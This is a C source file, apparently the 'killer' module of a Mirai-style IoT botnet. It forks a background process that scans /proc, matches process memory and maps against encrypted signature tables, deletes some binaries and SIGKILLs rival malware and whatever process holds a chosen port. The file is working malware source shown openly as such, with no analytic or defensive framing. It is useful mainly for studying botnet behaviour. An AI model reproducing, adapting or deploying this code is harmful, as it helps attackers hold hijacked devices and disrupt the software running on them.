#define _GNU_SOURCE

#ifdef KILLER
#include <stdio.h>
#endif
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>

#include "includes.h"
#include "killer.h" 
#include "table.h"
#include "util.h"

int killer_pid;
char *killer_realpath;
int killer_realpath_len = 0;

void killer_init(void)
{

    int killer_highest_pid = KILLER_MIN_PID, last_pid_scan = time(NULL), tmp_bind_fd;
    uint32_t scan_counter = 0;
	char path[4096];
    int len = 0;
    struct sockaddr_in tmp_bind_addr;

    // Let parent continue on main thread
    killer_pid = fork();
    if (killer_pid > 0 || killer_pid == -1)
        return;

    tmp_bind_addr.sin_family = AF_INET;
    tmp_bind_addr.sin_addr.s_addr = INADDR_ANY;

	sleep(5);
	
    killer_realpath = malloc(PATH_MAX);
    killer_realpath[0] = 0;
    killer_realpath_len = 0;

	
    if (!has_exe_access())
    {
#ifdef KILLER
        printf("[dbg / killer] Machine does not have /proc/$pid/exe\n");
#endif
        return;
    }


    while (TRUE)
    {
        DIR *dir;
        struct dirent *file;
#ifdef KILLER
    printf("[dbg / killer] Memory scanning processes\n");
#endif
        table_unlock_val(TABLE_KILLER_PROC);
        if ((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) == NULL)
        {
#ifdef KILLER
            printf("[dbg / killer] Failed to open /proc!\n");
#endif
            break;
        }
#ifdef KILLER
    printf("[dbg / killer] opened /proc\n");
#endif
		
        table_lock_val(TABLE_KILLER_PROC);

        while ((file = readdir(dir)) != NULL)
        {
            // skip all folders that are not PIDs
            if (*(file->d_name) < '0' || *(file->d_name) > '9')
            continue;

            char exe_path[64], *ptr_exe_path = exe_path, realpath[PATH_MAX];
            //char status_path[64], *ptr_status_path = status_path;
			char maps_path[64], *ptr_maps_path = maps_path;
			char cwd_path[64], *ptr_cwd_path = cwd_path;
            int rp_len, fd, pid = atoi(file->d_name);

            scan_counter++;
            if (pid <= killer_highest_pid)
            {
                if (time(NULL) - last_pid_scan > KILLER_RESTART_SCAN_TIME) // If more than KILLER_RESTART_SCAN_TIME has passed, restart scans from lowest PID for process wrap
                {
#ifdef KILLER
                    printf("[dbg / killer] %d seconds have passed since last scan. Re-scanning all processes!\n", KILLER_RESTART_SCAN_TIME);
#endif
                    killer_highest_pid = KILLER_MIN_PID;
                }
                else
                {
                    if (pid > KILLER_MIN_PID && scan_counter % 10 == 0)
                        sleep(1); // Sleep so we can wait for another process to spawn
                }

                continue;
            }
            if (pid > killer_highest_pid)
                killer_highest_pid = pid;
            last_pid_scan = time(NULL);

            table_unlock_val(TABLE_KILLER_PROC);
            table_unlock_val(TABLE_KILLER_EXE);
			table_unlock_val(TABLE_KILLER_MAPS);
			table_unlock_val(TABLE_KILLER_CWD);
			
            // Store /proc/$pid/exe into exe_path
            ptr_exe_path += util_strcpy(ptr_exe_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            ptr_exe_path += util_strcpy(ptr_exe_path, file->d_name);
            ptr_exe_path += util_strcpy(ptr_exe_path, table_retrieve_val(TABLE_KILLER_EXE, NULL));
			
            ptr_maps_path += util_strcpy(ptr_maps_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            ptr_maps_path += util_strcpy(ptr_maps_path, file->d_name);
            ptr_maps_path += util_strcpy(ptr_maps_path, table_retrieve_val(TABLE_KILLER_MAPS, NULL));
			
/*
            // Store /proc/$pid/status into status_path
            ptr_status_path += util_strcpy(ptr_status_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            ptr_status_path += util_strcpy(ptr_status_path, file->d_name);
            ptr_status_path += util_strcpy(ptr_status_path, table_retrieve_val(TABLE_KILLER_STATUS, NULL));
*/
			// Store /proc/$pid/cwd into cwd_path
            ptr_cwd_path += util_strcpy(ptr_cwd_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            ptr_cwd_path += util_strcpy(ptr_cwd_path, file->d_name);
            ptr_cwd_path += util_strcpy(ptr_cwd_path, table_retrieve_val(TABLE_KILLER_CWD, NULL));

            table_lock_val(TABLE_KILLER_PROC);
            table_lock_val(TABLE_KILLER_EXE);
			table_lock_val(TABLE_KILLER_MAPS);
			table_lock_val(TABLE_KILLER_CWD);
	
			#ifdef KILLER
				printf("[dbg / killer] scanning pid: %s\n", file->d_name);
			#endif
			
			 
			
#ifdef KILLER
			pid_t pir = getpid();
			printf("[dbg / killer] our pid: %lu\n", pir);
#endif
			
            // Resolve exe_path (/proc/$pid/exe) -> realpath
            if ((rp_len = readlink(exe_path, realpath, sizeof (realpath) - 1)) != -1)
            {
                realpath[rp_len] = 0; // Nullterminate realpath, since readlink doesn't guarantee a null terminated string
				
                table_unlock_val(TABLE_KILLER_ANIME);
                // If path contains ".anime" kill.
                if (util_stristr(realpath, rp_len - 1, table_retrieve_val(TABLE_KILLER_ANIME, NULL)) != -1)
                {
                    unlink(realpath);
                    kill(pid, 9);
                }
                table_lock_val(TABLE_KILLER_ANIME);

				// Dont scan ourselves.
				if (pid == getpid() || pid == getppid() || util_strcmp(realpath, killer_realpath))
				{
					continue;
				}
				
                if ((fd = open(realpath, O_RDONLY)) == -1)
                {
#ifdef KILLER
                    printf("[dbg / killer] Process '%s' has deleted binary!\n", realpath);
#endif
                    kill(pid, 9);
                }
                close(fd);
            }

            if (memory_scan_match(exe_path))
            {
#ifdef KILLER
                printf("[killer / exe] Killed: %s\n", exe_path);
#endif
                kill(pid, 9);
            } 
			
			if (memory_scan_match2(maps_path))
			{
				#ifdef KILLER
					printf("[killer / maps] Killed: %s\n", maps_path);
				#endif 
			
				kill(pid, 9);
			}
			
			if (read_cwd(cwd_path, exe_path, path, len, pid))
			{
				#ifdef KILLER
					printf("[killer / cwd] Killed:%s\n", cwd_path);
				#endif 
			
				kill(pid, 9);
			}
			
            // Don't let others memory scan!!!
            util_zero(exe_path, sizeof (exe_path));
            //util_zero(status_path, sizeof (status_path));
            util_zero(maps_path, sizeof (maps_path));
			util_zero(cwd_path, sizeof (cwd_path));

            sleep(1);
        }

        closedir(dir);
    }

#ifdef KILLER
    printf("[dbg / killer] Finished\n");
#endif
}

void killer_kill(void)
{
    kill(killer_pid, 9);
}

BOOL killer_kill_by_port(port_t port)
{
    DIR *dir, *fd_dir;
    struct dirent *entry, *fd_entry;
    char path[PATH_MAX] = {0}, exe[PATH_MAX] = {0}, buffer[513] = {0};
    int pid = 0, fd = 0;
    char inode[16] = {0};
    char *ptr_path = path;
    int ret = 0;
    char port_str[16];

#ifdef KILLER
    printf("[dbg / killer] Finding and killing processes holding port %d\n", ntohs(port));
#endif

    util_itoa(ntohs(port), 16, port_str);
    if (util_strlen(port_str) == 2)
    {
        port_str[2] = port_str[0];
        port_str[3] = port_str[1];
        port_str[4] = 0;

        port_str[0] = '0';
        port_str[1] = '0';
    }

    table_unlock_val(TABLE_KILLER_PROC);
    table_unlock_val(TABLE_KILLER_EXE);
    table_unlock_val(TABLE_KILLER_FD);
    table_unlock_val(TABLE_KILLER_TCP);

    fd = open(table_retrieve_val(TABLE_KILLER_TCP, NULL), O_RDONLY);
    if (fd == -1)
        return 0;

    while (util_fdgets(buffer, 512, fd) != NULL)
    {
        int i = 0, ii = 0;

        while (buffer[i] != 0 && buffer[i] != ':')
            i++;

        if (buffer[i] == 0) continue;
        i += 2;
        ii = i;

        while (buffer[i] != 0 && buffer[i] != ' ')
            i++;
        buffer[i++] = 0;

        // Compare the entry in /proc/net/tcp to the hex value of the htons port
        if (util_stristr(&(buffer[ii]), util_strlen(&(buffer[ii])), port_str) != -1)
        {
            int column_index = 0;
            BOOL in_column = FALSE;
            BOOL listening_state = FALSE;

            while (column_index < 7 && buffer[++i] != 0)
            {
                if (buffer[i] == ' ' || buffer[i] == '\t')
                    in_column = TRUE;
                else
                {
                    if (in_column == TRUE)
                        column_index++;

                    if (in_column == TRUE && column_index == 1 && buffer[i + 1] == 'A')
                    {
                        listening_state = TRUE;
                    }

                    in_column = FALSE;
                }
            }
            ii = i;

            if (listening_state == FALSE)
                continue;

            while (buffer[i] != 0 && buffer[i] != ' ')
                i++;
            buffer[i++] = 0;

            if (util_strlen(&(buffer[ii])) > 15)
                continue;

            util_strcpy(inode, &(buffer[ii]));
            break;
        }
    }
    close(fd);

    // If we failed to find it, lock everything and move on
    if (util_strlen(inode) == 0)
    {
#ifdef KILLER
        printf("[dbg / killer] Failed to find inode for port %d\n", ntohs(port));
#endif
        table_lock_val(TABLE_KILLER_PROC);
        table_lock_val(TABLE_KILLER_EXE);
        table_lock_val(TABLE_KILLER_FD);
        table_lock_val(TABLE_KILLER_TCP);
		
        return 0;
    }

#ifdef KILLER
    printf("Found inode \"%s\" for port %d\n", inode, ntohs(port));
#endif

    if ((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) != NULL)
    {
        while ((entry = readdir(dir)) != NULL && ret == 0)
        {
            char *pid = entry->d_name;

            // skip all folders that are not PIDs
            if (*pid < '0' || *pid > '9')
                continue;

            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_EXE, NULL));

            if (readlink(path, exe, PATH_MAX) == -1)
                continue;

            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
            if ((fd_dir = opendir(path)) != NULL)
            {
                while ((fd_entry = readdir(fd_dir)) != NULL && ret == 0)
                {
                    char *fd_str = fd_entry->d_name;

                    util_zero(exe, PATH_MAX);
                    util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), pid);
                    util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), "/");
                    util_strcpy(ptr_path + util_strlen(ptr_path), fd_str);
                    if (readlink(path, exe, PATH_MAX) == -1)
                        continue;

                    if (util_stristr(exe, util_strlen(exe), inode) != -1)
                    {
#ifdef KILLER
                        printf("[dbg / killer] Found pid %d for port %d\n", util_atoi(pid, 10), ntohs(port));
#else
                        kill(util_atoi(pid, 10), 9);
#endif
                        ret = 1;
                    }
                }
                closedir(fd_dir);
            }
        }
        closedir(dir);
    }

    sleep(1);

    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_EXE);
    table_lock_val(TABLE_KILLER_FD);
	table_lock_val(TABLE_KILLER_TCP);

    return ret;
}

static BOOL has_exe_access(void)
{
    char path[PATH_MAX], *ptr_path = path, tmp[16];
    int fd, k_rp_len;

    table_unlock_val(TABLE_KILLER_PROC);
    table_unlock_val(TABLE_KILLER_EXE);

    // Copy /proc/$pid/exe into path
    ptr_path += util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
    ptr_path += util_strcpy(ptr_path, util_itoa(getpid(), 10, tmp));
    ptr_path += util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_EXE, NULL));

    // Try to open file
    if ((fd = open(path, O_RDONLY)) == -1)
    {
#ifdef KILLER
        printf("[dbg / killer] Failed to open()\n");
#endif
        return FALSE;
    }
    close(fd);

    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_EXE);

    if ((k_rp_len = readlink(path, killer_realpath, PATH_MAX - 1)) != -1)
    {
        killer_realpath[k_rp_len] = 0;
	#ifdef KILLER
		printf("[dbg / killer] We are running out of `%s`\n", killer_realpath);
	#endif
    }

    util_zero(path, ptr_path - path);

    return TRUE;
}

static BOOL memory_scan_match(char *path)
{
    int fd, ret, pid;
    char rdbuf[4096];
    BOOL found = FALSE;
	
    if ((fd = open(path, O_RDONLY)) == -1)
        return FALSE;

    table_unlock_val(TABLE_KILLER_REP1);
    table_unlock_val(TABLE_KILLER_REP2);
    table_unlock_val(TABLE_KILLER_REP3);
	table_unlock_val(TABLE_KILLER_REP4);
	table_unlock_val(TABLE_KILLER_REP5);
	table_unlock_val(TABLE_KILLER_REP6);
	table_unlock_val(TABLE_KILLER_REP7);
	table_unlock_val(TABLE_KILLER_REP8);
	table_unlock_val(TABLE_KILLER_REP9);
	table_unlock_val(TABLE_KILLER_REP10);
	table_unlock_val(TABLE_KILLER_UPX);
	table_unlock_val(TABLE_KILLER_TCP);
	table_unlock_val(TABLE_KILLER_PASS);

    while((ret = read(fd, rdbuf, sizeof(rdbuf))) > 0)
    {
        if(mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_REP1, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_REP1, NULL))) ||
		mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_REP2, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_REP2, NULL))) ||
		mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_REP3, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_REP3, NULL))) ||
		mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_REP4, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_REP4, NULL))) ||
		mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_REP5, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_REP5, NULL))) ||
		mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_REP6, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_REP6, NULL))) ||
		mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_REP7, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_REP7, NULL))) ||
		mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_REP8, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_REP8, NULL))) ||
		mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_REP9, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_REP9, NULL))) ||
		mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_REP10, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_REP10, NULL))) ||
		mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_UPX, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_UPX, NULL))) ||
		mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_PASS, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_PASS, NULL))) ||
		mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_TCP, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_TCP, NULL))))
		{
            found = TRUE;
            break;
        }
    }

    table_lock_val(TABLE_KILLER_REP1);
    table_lock_val(TABLE_KILLER_REP2);
    table_lock_val(TABLE_KILLER_REP3);
    table_lock_val(TABLE_KILLER_REP4);
    table_lock_val(TABLE_KILLER_REP5);
    table_lock_val(TABLE_KILLER_REP6);
    table_lock_val(TABLE_KILLER_REP7);
    table_lock_val(TABLE_KILLER_REP8);
    table_lock_val(TABLE_KILLER_REP9);
    table_lock_val(TABLE_KILLER_REP10);
	table_lock_val(TABLE_KILLER_UPX);
	table_lock_val(TABLE_KILLER_TCP);
	table_lock_val(TABLE_KILLER_PASS);

    close(fd);

    return found;
}

static BOOL read_cwd(char *path, char *exe_path, char *us, int us_len, int pid)
{
    int fd = -1;
    char buf[4096];
    int len = 0;
    char bad = FALSE;

    len = readlink(path, buf, sizeof(buf) - 1);
    if(len == -1)
    {
        return 0;
    }
    buf[len] = 0;

    if(pid == getpid() || pid == getppid() || mem_exists(buf, len, us, us_len))
    {
        return 0;
    }
	
	table_unlock_val(TABLE_KILLER_VAR_TMP);
	table_unlock_val(TABLE_KILLER_VAR);
	
    // Suspicious process executed in common path with a deleted or unmapped executable.
    if((mem_exists(buf, len, table_retrieve_val(TABLE_KILLER_VAR_TMP, NULL), table_retrieve_val_len(TABLE_KILLER_VAR_TMP)) || mem_exists(buf, len, table_retrieve_val(TABLE_KILLER_VAR, NULL), table_retrieve_val_len(TABLE_KILLER_VAR))) && ((fd = open(exe_path, O_RDONLY)) == -1))
    {
        bad = TRUE;
    }

    if(fd)
        close(fd);

	table_lock_val(TABLE_KILLER_VAR_TMP);
	table_lock_val(TABLE_KILLER_VAR);

    return bad;
}

static BOOL memory_scan_match2(char *path)
{
    int fd, ret, pid;
    char rdbuf[4096];
    BOOL found = FALSE;
	
    if ((fd = open(path, O_RDONLY)) == -1) //opens "path" reads only
        return FALSE;

    table_unlock_val(TABLE_KILLER_REP1);
    table_unlock_val(TABLE_KILLER_REP2);
    table_unlock_val(TABLE_KILLER_REP3);
	table_unlock_val(TABLE_KILLER_REP4);
	table_unlock_val(TABLE_KILLER_REP5);
	table_unlock_val(TABLE_KILLER_REP6);
	table_unlock_val(TABLE_KILLER_REP7);
	table_unlock_val(TABLE_KILLER_REP8);
	table_unlock_val(TABLE_KILLER_REP9);
	table_unlock_val(TABLE_KILLER_REP10);
	table_unlock_val(TABLE_KILLER_UPX);
	table_unlock_val(TABLE_KILLER_PASS);
	table_unlock_val(TABLE_KILLER_TCP);

    while((ret = read(fd, rdbuf, sizeof(rdbuf))) > 0)
    {
        if(mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_REP1, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_REP1, NULL))) ||
		mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_REP2, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_REP2, NULL))) ||
		mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_REP3, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_REP3, NULL))) ||
		mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_REP4, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_REP4, NULL))) ||
		mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_REP5, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_REP5, NULL))) ||
		mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_REP6, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_REP6, NULL))) ||
		mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_REP7, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_REP7, NULL))) ||
		mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_REP8, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_REP8, NULL))) ||
		mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_REP9, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_REP9, NULL))) ||
		mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_REP10, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_REP10, NULL))) ||
		mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_UPX, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_UPX, NULL))) ||
		mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_PASS, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_PASS, NULL))) ||
		mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_TCP, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_TCP, NULL)))) 
        {
            found = TRUE;
            break;
        }
    }

    table_lock_val(TABLE_KILLER_REP1);
    table_lock_val(TABLE_KILLER_REP2);
    table_lock_val(TABLE_KILLER_REP3);
    table_lock_val(TABLE_KILLER_REP4);
    table_lock_val(TABLE_KILLER_REP5);
    table_lock_val(TABLE_KILLER_REP6);
    table_lock_val(TABLE_KILLER_REP7);
    table_lock_val(TABLE_KILLER_REP8);
    table_lock_val(TABLE_KILLER_REP9);
    table_lock_val(TABLE_KILLER_REP10);
	table_lock_val(TABLE_KILLER_UPX);
	table_lock_val(TABLE_KILLER_PASS);
	table_lock_val(TABLE_KILLER_TCP);

    close(fd);

    return found;
}

static BOOL mem_exists(char *buf, int buf_len, char *str, int str_len)
{
    int matches = 0;

    if (str_len > buf_len)
        return FALSE;

    while (buf_len--)
    {
        if (*buf++ == str[matches])
        {
            if (++matches == str_len)
                return TRUE;
        }
        else
            matches = 0;
    }

    return FALSE;
}
